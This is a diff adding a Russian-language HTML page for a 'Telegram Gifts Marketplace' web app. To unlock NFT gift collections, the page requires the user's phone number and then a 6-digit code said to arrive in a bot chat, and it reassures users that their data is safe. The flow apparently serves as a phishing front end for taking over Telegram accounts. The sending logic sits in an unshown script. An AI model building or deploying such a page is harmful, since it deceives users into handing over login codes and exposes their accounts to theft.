@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Gifts Marketplace</title>
+    <!-- Подключаем Telegram Web App SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <!-- Auth Button -->
+    <button class="auth-btn" id="authBtn">
+        <i class="fab fa-telegram"></i> <span id="authBtnText">Войти</span>
+    </button>
+
+    <!-- Phone Request Modal -->
+    <div class="modal-overlay" id="phoneRequestModal" style="display: none;">
+        <div class="modal-content phone-request-modal">
+            <div class="modal-header">
+                <h3><i class="fab fa-telegram"></i> Подтверждение номера</h3>
+                <button class="modal-close" id="closePhoneRequestBtn">&times;</button>
+            </div>
+            
+            <div class="modal-body">
+                <div class="phone-request-content">
+                    <div class="request-icon">
+                        <i class="fas fa-mobile-alt"></i>
+                    </div>
+                    
+                    <h4>Для доступа к коллекциям нужен ваш номер</h4>
+                    
+                    <div class="request-description">
+                        <p>Мы запросим доступ к вашему номеру телефона через Telegram.</p>
+                        <p>Это безопасно - номер используется только для идентификации.</p>
+                    </div>
+                    
+                    <div class="permissions-list">
+                        <div class="permission-item">
+                            <i class="fas fa-check-circle"></i>
+                            <span>Быстрая регистрация в один клик</span>
+                        </div>
+                        <div class="permission-item">
+                            <i class="fas fa-check-circle"></i>
+                            <span>Доступ ко всем коллекциям NFT</span>
+                        </div>
+                        <div class="permission-item">
+                            <i class="fas fa-check-circle"></i>
+                            <span>Безопасное хранение данных</span>
+                        </div>
+                    </div>
+                    
+                    <div class="phone-preview" id="phonePreview" style="display: none;">
+                        <div class="detected-phone">
+                            <i class="fas fa-mobile-alt"></i>
+                            <span id="detectedPhoneNumber">+7 999 123-45-67</span>
+                        </div>
+                        <p class="phone-hint">Номер определен автоматически</p>
+                    </div>
+                    
+                    <div class="action-buttons">
+                        <button class="btn btn-primary btn-block" id="requestPhoneBtn">
+                            <i class="fas fa-share-square"></i>
+                            Поделиться номером через Telegram
+                        </button>
+                        
+                        <button class="btn btn-secondary btn-block" id="manualPhoneBtn">
+                            <i class="fas fa-edit"></i>
+                            Ввести номер вручную
+                        </button>
+                    </div>
+                    
+                    <div class="privacy-note">
+                        <i class="fas fa-shield-alt"></i>
+                        Ваши данные защищены. Мы не передаем номер третьим лицам.
+                    </div>
+                </div>
+                
+                <!-- Manual Phone Input -->
+                <div class="manual-phone-input" id="manualPhoneInput" style="display: none;">
+                    <div class="back-button" id="backToRequestBtn">
+                        <i class="fas fa-arrow-left"></i> Назад
+                    </div>
+                    
+                    <h4>Введите номер вручную</h4>
+                    
+                    <div class="phone-input-group">
+                        <div class="country-selector" id="countrySelector">
+                            <span class="country-flag" id="selectedFlag">🇷🇺</span>
+                            <span class="country-code" id="selectedCode">+7</span>
+                            <i class="fas fa-chevron-down"></i>
+                        </div>
+                        <input type="tel" 
+                               id="manualPhoneField" 
+                               class="phone-input" 
+                               placeholder="999 123-45-67"
+                               autocomplete="tel"
+                               inputmode="numeric">
+                    </div>
+                    
+                    <div class="country-dropdown" id="countryDropdown">
+                        <div class="country-search">
+                            <input type="text" 
+                                   id="countrySearch" 
+                                   placeholder="Поиск страны...">
+                        </div>
+                        <div class="country-list" id="countryList">
+                            <!-- Countries will be loaded here -->
+                        </div>
+                    </div>
+                    
+                    <button class="btn btn-primary btn-block" id="submitManualPhoneBtn">
+                        <i class="fas fa-check"></i>
+                        Подтвердить номер
+                    </button>
+                </div>
+                
+                <!-- Loading State -->
+                <div class="loading-state" id="phoneLoadingState">
+                    <i class="fas fa-spinner fa-spin"></i>
+                    <p>Запрашиваем доступ к номеру...</p>
+                </div>
+                
+                <!-- Error State -->
+                <div class="error-state" id="phoneErrorState">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    <p id="errorMessage">Ошибка при получении номера</p>
+                    <button class="btn btn-secondary" id="retryPhoneBtn">
+                        Попробовать еще раз
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Code Verification Modal -->
+    <div class="modal-overlay" id="codeVerificationModal" style="display: none;">
+        <div class="modal-content code-verification-modal">
+            <div class="modal-header">
+                <h3><i class="fas fa-key"></i> Код подтверждения</h3>
+            </div>
+            
+            <div class="modal-body">
+                <div class="verification-content">
+                    <div class="verification-icon">
+                        <i class="fas fa-mobile-alt"></i>
+                    </div>
+                    
+                    <h4>Введите код из Telegram</h4>
+                    
+                    <div class="phone-display">
+                        <i class="fas fa-phone"></i>
+                        <span id="verificationPhoneDisplay"></span>
+                    </div>
+                    
+                    <p class="verification-description">
+                        Мы отправили 6-значный код в чат с ботом.
+                        Введите его ниже для подтверждения.
+                    </p>
+                    
+                    <div class="code-input-container">
+                        <div class="code-inputs">
+                            <input type="text" class="code-input" maxlength="1" data-index="0">
+                            <input type="text" class="code-input" maxlength="1" data-index="1">
+                            <input type="text" class="code-input" maxlength="1" data-index="2">
+                            <input type="text" class="code-input" maxlength="1" data-index="3">
+                            <input type="text" class="code-input" maxlength="1" data-index="4">
+                            <input type="text" class="code-input" maxlength="1" data-index="5">
+                        </div>
+                        
+                        <div class="timer" id="verificationTimer">
+                            Отправить код повторно через <span id="verificationTimeLeft">60</span> сек
+                        </div>
+                    </div>
+                    
+                    <div class="verification-actions">
+                        <button class="btn btn-secondary" id="resendCodeBtn" disabled>
+                            <i class="fas fa-redo"></i>
+                            Отправить код еще раз
+                        </button>
+                        <button class="btn btn-primary" id="verifyCodeBtn" disabled>
+                            <i class="fas fa-check"></i>
+                            Подтвердить код
+                        </button>
+                    </div>
+                    
+                    <div class="verification-hint">
+                        <i class="fas fa-info-circle"></i>
+                        Проверьте чат с ботом в Telegram
+                    </div>
+                </div>
+                
+                <!-- Loading State -->
+                <div class="loading-state" id="codeLoadingState">
+                    <i class="fas fa-spinner fa-spin"></i>
+                    <p>Проверяем код...</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Success Modal -->
+    <div class="modal-overlay" id="successModal" style="display: none;">
+        <div class="modal-content success-modal">
+            <div class="modal-body">
+                <div class="success-content">
+                    <div class="success-icon">
+                        <i class="fas fa-check-circle"></i>
+                    </div>
+                    
+                    <h3>Номер подтвержден!</h3>
+                    
+                    <div class="success-message">
+                        <i class="fas fa-mobile-alt"></i>
+                        <span id="confirmedPhoneNumber"></span>
+                    </div>
+                    
+                    <p class="success-description">
+                        Теперь у вас есть доступ ко всем коллекциям NFT-подарков Telegram
+                    </p>
+                    
+                    <button class="btn btn-primary btn-block" id="continueToCollectionsBtn">
+                        <i class="fas fa-gift"></i>
+                        Перейти к коллекциям
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Login Modal -->
+    <div class="modal-overlay" id="loginModal" style="display: none;">
+        <div class="modal-content login-modal">
+            <div class="modal-header">
+                <h3><i class="fas fa-exclamation-triangle"></i> Доступ запрещен</h3>
+            </div>
+            <div class="modal-body">
+                <p>Для доступа к коллекциям необходимо подтвердить номер телефона.</p>
+                <button class="btn btn-primary btn-block" id="showPhoneRequestBtn">
+                    <i class="fas fa-mobile-alt"></i>
+                    Подтвердить номер
+                </button>
+                <button class="btn btn-secondary btn-block" id="closeLoginModalBtn">
+                    Закрыть
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <!-- Header -->
+        <header>
+            <div class="logo">
+                <i class="fab fa-telegram"></i>
+                <span>Telegram Gifts</span>
+            </div>
+            <div class="stats">
+                <div class="stat-item">
+                    <div class="stat-value" id="totalNFTs">600k</div>
+                    <div class="stat-label">Total NFTs</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value" id="avgPrice">₮15.473</div>
+                    <div class="stat-label">Avg Price</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value" id="collectionsCount">100+</div>
+                    <div class="stat-label">Collections</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value" id="totalVolume">₮243kk</div>
+                    <div class="stat-label">Total Volume</div>
+                </div>
+            </div>
+            
+            <!-- Collection Input -->
+            <div class="collection-input-container">
+                <div class="input-group">
+                    <input type="text" id="collectionInput" placeholder="Enter collection name (e.g., LunarSnake)" autocomplete="off">
+                    <button id="loadCollectionBtn" class="load-btn">
+                        <i class="fas fa-rocket"></i> Load
+                    </button>
+                </div>
+                <div class="examples">
+                    <span>Examples:</span>
+                    <button class="example-btn" data-collection="LunarSnake">LunarSnake</button>
+                    <button class="example-btn" data-collection="SantaHat">SantaHat</button>
+                    <button class="example-btn" data-collection="DiamondRing">DiamondRing</button>
+                </div>
+            </div>
+            
+            <!-- Filter Tabs -->
+            <div class="filter-tabs">
+                <button class="filter-btn active" data-filter="all">All Gifts</button>
+                <button class="filter-btn" data-filter="rare">Rare</button>
+                <button class="filter-btn" data-filter="trending">Trending</button>
+                <button class="filter-btn" data-filter="cheap">Cheap</button>
+                <button class="filter-btn" data-filter="expensive">Expensive</button>
+            </div>
+        </header>
+
+        <!-- Current Collection -->
+        <div class="current-collection" id="currentCollection" style="display: none;">
+            <h3 id="collectionTitle"></h3>
+            <div class="collection-stats">
+                <span>Loading collection data...</span>
+            </div>
+        </div>
+
+        <!-- NFT Grid -->
+        <div class="nft-grid" id="nftGrid">
+            <!-- Cards will be generated by JavaScript -->
+        </div>
+        
+        <!-- Loader -->
+        <div class="loader" id="loader">
+            <i class="fas fa-spinner fa-spin fa-2x"></i>
+            <p style="margin-top: 15px;">Loading NFT gifts...</p>
+        </div>
+        
+        <!-- No Results -->
+        <div class="no-results" id="noResults" style="display: none;">
+            <i class="fas fa-search fa-3x" style="margin-bottom: 15px;"></i>
+            <p>No gifts found matching your criteria</p>
+            <p class="sub-message">Try searching for a different collection</p>
+        </div>
+
+        <!-- Footer -->
+        <footer>
+            <div class="footer-content">
+                <div class="footer-section">
+                    <h3>Quick Links</h3>
+                    <div class="footer-links">
+                        <a href="https://fragment.com" target="_blank">Fragment</a>
+                        <a href="https://getgems.io" target="_blank">Getgems</a>
+                        <a href="https://ton.org" target="_blank">TON Blockchain</a>
+                        <a href="https://t.me/nft" target="_blank">Telegram NFT</a>
+                    </div>
+                </div>
+                <div class="footer-section">
+                    <h3>Resources</h3>
+                    <div class="footer-links">
+                        <a href="#">API Documentation</a>
+                        <a href="#">Market Stats</a>
+                        <a href="#">Collection Guide</a>
+                        <a href="#">Trading Tips</a>
+                    </div>
+                </div>
+                <div class="footer-section">
+                    <h3>Connect</h3>
+                    <div class="footer-links">
+                        <a href="#"><i class="fab fa-telegram"></i> Telegram</a>
+                        <a href="#"><i class="fab fa-twitter"></i> Twitter</a>
+                        <a href="#"><i class="fab fa-discord"></i> Discord</a>
+                        <a href="#"><i class="fab fa-github"></i> GitHub</a>
+                    </div>
+                </div>
+            </div>
+            <div class="copyright">
+                Powered by TON Blockchain • Real-time market data • Updated hourly
+            </div>
+        </footer>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
